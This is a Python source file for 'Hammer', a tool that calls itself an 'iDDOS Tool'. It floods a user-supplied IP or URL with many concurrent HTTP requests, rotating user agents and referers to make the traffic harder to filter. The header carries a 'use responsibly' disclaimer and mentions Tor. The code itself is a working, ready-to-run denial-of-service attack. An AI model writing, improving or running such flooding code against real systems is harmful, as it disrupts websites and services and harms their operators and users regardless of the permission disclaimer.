#!/usr/bin/env python3

#
#  Hammer -- By, Kanax01
#
#  Uses HTTP flooding to overwhelm the target
#  Use responsibly and only against targets you have permission to test
#
#  This tool is built for Windows and may require adjustments for other platforms
#
#  This tool uses the GNU General Public License v3.0 (GPL-3.0) for open-source distribution
#
#  Its recommended to have chocolatey installed for easy Tor installation, but it's not required if you have Tor already set up
#

import concurrent.futures
import os
import random
import threading
import requests
import subprocess
import sys
import time
import socket
from colorama import Fore, Style, init
from referers import get_headers_referers
from useragents import get_useragents

try:
    import msvcrt
except ImportError:
    msvcrt = None

STOP_EVENT = threading.Event()


def banner():
    print(Fore.YELLOW + r"""
          
       T                                    \`.    T
       |    T     .--------------.___________) \   |    T
       !    |     |//////////////|___________[ ]   !  T |
            !     `--------------'           ) (      | !
                                             '-'      !
          
          
         __    __       ___      .___  ___. .___  ___.  _______ .______      
        |  |  |  |     /   \     |   \/   | |   \/   | |   ____||   _  \     
        |  |__|  |    /  ^  \    |  \  /  | |  \  /  | |  |__   |  |_)  |    
        |   __   |   /  /_\  \   |  |\/|  | |  |\/|  | |   __|  |      /     
        |  |  |  |  /  _____  \  |  |  |  | |  |  |  | |  |____ |  |\  \----.
        |__|  |__| /__/     \__\ |__|  |__| |__|  |__| |_______|| _| `._____|
                                                                       
          """ + Style.RESET_ALL)
    
    print(Fore.CYAN + Style.BRIGHT + "\nBy, Kanax01" + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + "Hammer -- iDDOS Tool" + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + "Use responsibly!!!" + Style.RESET_ALL)
    

def build_headers(useragents, referers):
    return {
        "User-Agent": random.choice(useragents),
        "Referer": random.choice(referers)
    }


def listen_for_end():
    if not msvcrt:
        return

    while not STOP_EVENT.is_set():
        if msvcrt.kbhit():
            key = msvcrt.getch()
            if key in (b'\x00', b'\xe0'):
                special = msvcrt.getch()
                if special == b'O':
                    STOP_EVENT.set()
                    print(Fore.RED + Style.BRIGHT + "\nEND key pressed: stopping attack..." + Style.RESET_ALL)
                    time.sleep(1)
                    sys.exit()

def send_request(session, target, headers, timeout=5, use_tor=False):
    try:
        response = session.get(target, headers=headers, timeout=timeout)
        return response.status_code
    except requests.RequestException:
        return None


def attack_target(target, useragents, referers, count, threads):
    
    print(Fore.GREEN + Style.BRIGHT + f"Starting attack: {count} requests to {target}" + Style.RESET_ALL)
    print(Fore.YELLOW + "Press END to stop the program at any time." + Style.RESET_ALL)

    with requests.Session() as session:
        session.headers.update({"Connection": "keep-alive"})

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for attempt in range(1, count + 1):
                if STOP_EVENT.is_set():
                    break

                headers = build_headers(useragents, referers)
                future = executor.submit(send_request, session, target, headers, 5)
                futures.append((attempt, headers, future))

            for attempt, headers, future in futures:
                if STOP_EVENT.is_set():
                    break

                status = future.result()
                status_text = str(status) if status else "error"
                print(Fore.CYAN + f"[{attempt}/{count}] status={status_text} user-agent={headers['User-Agent'][:48]}..." + Style.RESET_ALL)

    if STOP_EVENT.is_set():
        print(Fore.RED + Style.BRIGHT + "Attack stopped by user." + Style.RESET_ALL)
    else:
        print(Fore.GREEN + Style.BRIGHT + "Attack complete." + Style.RESET_ALL)


def main():
    init(autoreset=True)
    os.system("title Hammer - By, Kanax01")
    banner()
    
    target = input(Fore.GREEN + Style.BRIGHT + "Enter Target (either IP or URL): " + Style.RESET_ALL).strip()
    if not target:
        print(Fore.RED + "No target specified. Exiting." + Style.RESET_ALL)
        return

    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    try:
        count = int(input(Fore.GREEN + Style.BRIGHT + "Request count: " + Style.RESET_ALL).strip())
    except ValueError:
        count = 10

    try:
        threads = int(input(Fore.GREEN + Style.BRIGHT + "Concurrency threads (default 20): " + Style.RESET_ALL).strip())
    except ValueError:
        threads = 20
    

    useragents = get_useragents()
    referers = get_headers_referers()

    listener = threading.Thread(target=listen_for_end, daemon=True)
    listener.start()
    
    try:
        attack_target(target, useragents, referers, count, threads)
    finally:
        exit_msg = input(Fore.YELLOW + Style.BRIGHT + "Press Enter to exit..." + Style.RESET_ALL)
        sys.exit()

if __name__ == '__main__':
    main()
